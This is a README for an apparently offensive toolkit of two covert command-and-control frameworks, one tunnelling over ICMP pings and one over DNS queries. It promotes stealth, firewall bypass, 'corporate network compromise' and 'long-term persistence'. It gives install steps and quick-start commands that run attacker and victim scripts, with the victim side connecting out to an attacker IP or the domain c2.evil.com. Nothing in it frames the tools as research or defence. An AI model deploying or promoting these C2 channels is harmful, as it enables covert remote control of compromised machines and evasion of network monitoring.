# C2 Framework Collection

Two production-ready covert command and control frameworks using different network protocols.

## Available Frameworks

### [ICMP C2](ICMP/)

**Protocol**: ICMP Echo Request/Reply (Ping)

- ✅ High bandwidth (~1200 bytes per beacon)
- ✅ Simple setup, no encoding
- ✅ Fast command execution
- ⚠️ Medium stealth, ICMP can be logged

**Best for**: High-bandwidth C2, fast command execution, simple setup

### [DNS C2](DNS/)

**Protocol**: DNS Tunneling (UDP port 53)

- ✅ Maximum stealth (true DNS tunnel through infrastructure)
- ✅ Excellent firewall bypass (DNS always allowed)
- ✅ Works through corporate proxies
- ✅ Socket-based DNS server (production-ready)
- ⚠️ Requires domain ownership (~$10-15/year)
- ⚠️ Lower bandwidth (~125 bytes per query)

**Best for**: Maximum stealth, corporate network compromise, long-term persistence

**Key Features**:

- Socket-based authoritative DNS server (binds to port 53)
- Works with NS delegation from Google DNS, CloudFlare, etc.
- Case-insensitive protocol parsing (handles DNS 0x20)
- Automatic fragmentation for large outputs
- Base32 encoding for DNS-safe transmission

## Quick Comparison

| Feature              | ICMP C2            | DNS C2           |
| -------------------- | ------------------ | ---------------- |
| **Bandwidth**        | High (~1200 bytes) | Low (~125 bytes) |
| **Stealth**          | Medium             | High             |
| **Firewall Bypass**  | Good               | Excellent        |
| **Setup Complexity** | Simple             | Moderate         |
| **Encoding**         | None (raw)         | Base32           |
| **Requirements**     | None               | Domain ownership |

## Installation

```bash
sudo apt update && sudo apt install -y python3-pip
sudo pip3 install scapy
```

**Note**: DNS C2 uses a socket-based DNS server (no additional DNS software needed)

## Quick Start

### ICMP C2

```bash
# Attacker
sudo python3 ICMP/attacker/attacker_icmp.py -a

# Victim
sudo python3 ICMP/victim/victim_icmp.py <attacker-ip>
```

### DNS C2

**Requires domain setup first!**

```bash
# Attacker
sudo python3 DNS/attacker/attacker_dns.py -d c2.evil.com -a

# Victim (production - through DNS infrastructure)
sudo python3 DNS/victim/victim_dns.py -d c2.evil.com

# Victim (testing - direct to attacker)
sudo python3 DNS/victim/victim_dns.py -d c2.evil.com -s <attacker-ip>
```

## Documentation

- **[ICMP/README.md](ICMP/README.md)** - Complete ICMP C2 documentation
- **[DNS/README.md](DNS/README.md)** - Complete DNS C2 documentation
